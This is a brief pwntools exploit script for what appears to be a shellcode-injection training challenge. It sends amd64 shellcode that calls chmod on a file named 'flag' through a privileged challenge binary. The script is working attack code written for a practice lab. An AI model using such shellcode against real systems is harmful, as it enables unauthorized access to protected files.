from pwn import *

context.update(arch="amd64", encoding="latin")

challenge = "/challenge/babyshell_level1"

flag = b'flag'[::-1].hex()

#shellcode = "nop\n"*2048
shellcode = f'''
push 0x{flag}
push rsp
pop rdi

push 6
pop rsi

push 0x5a
pop rax
syscall      
'''

shellcode = asm(shellcode)

with process([challenge], cwd='/') as p:
   # print(p.recvuntil(b'[LEAK]').decode())
    p.send(shellcode)
    print(p.interactive())